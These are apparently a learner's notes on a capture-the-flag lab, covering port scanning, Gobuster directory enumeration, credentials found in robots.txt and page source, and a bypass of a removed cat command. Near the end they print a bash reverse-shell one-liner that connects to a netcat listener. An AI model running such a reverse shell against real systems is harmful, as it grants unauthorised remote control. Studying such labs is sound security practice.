First thing to do to use map to find out available ports

Then we have to go through directory enumeration
Using Gobuster dir -u x.x.x.x -w /usr/shared/wordlist -x php, sh

Inspect  html to find info

IMPORTANT TO USE -X FLAG TO FIND EXTENSIONS LEADING TO PAGES SUCH AS LOGIN.PHP

Look through pages found

Login through password Found in robot.txt and username in index.php Elements

Interact with command line

What's interesting is cat command is removed but an alternative command to use is LESS which could to used to bypass cat command ban

First thing I thought of was to try using pen test monkey's reverse php shell script 

But after reading the walkthrough we used bash command to connect to our nc listener

bash -c 'bash -i >& /dev/tcp/10.10.80.171/8080 0>&1'

After spawning the shell we look through the folders to find the flags

Things to learn
- Privilege escalation
